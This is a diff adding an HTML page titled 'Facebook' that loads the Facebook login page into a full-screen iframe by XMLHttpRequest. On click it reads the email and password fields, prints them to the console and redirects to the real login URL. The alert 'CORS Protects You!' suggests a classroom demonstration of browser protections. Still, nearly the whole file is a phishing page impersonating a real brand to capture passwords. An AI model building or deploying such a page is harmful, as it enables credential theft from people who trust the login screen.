@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Facebook</title>
+
+    <style>
+        html, body {
+            height: 100%;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe id="myFrame"></iframe>
+    
+<script>
+
+var url = "https://en-gb.facebook.com/login/";
+
+function capture(evt) {
+    evt.preventDefault();
+    var pw = document.getElementById("myFrame").contentDocument.getElementById("pass").value;
+    var un = document.getElementById("myFrame").contentDocument.getElementById("email").value;
+    console.log("Your username is: " + un);
+    console.log("Your Password is: " + pw);
+    if (pw !== '' && un !== '') {
+        window.location.assign(url);
+    }
+    
+}
+
+// XMLHttpRequest
+var http = new XMLHttpRequest()
+http.onreadystatechange = function(ev) {
+    if(this.readyState === 4 && this.status === 200) {
+        document.getElementById("myFrame").contentDocument.write(this.responseText);
+        document.getElementById("myFrame").contentDocument.addEventListener("click", capture);
+    } else if (this.readyState === 4 && this.status !== 200) {
+        alert("Didn't work! CORS Protects You!");
+    }
+}
+http.open("GET", url);
+http.send();
+
+</script>
+</body>
+</html>
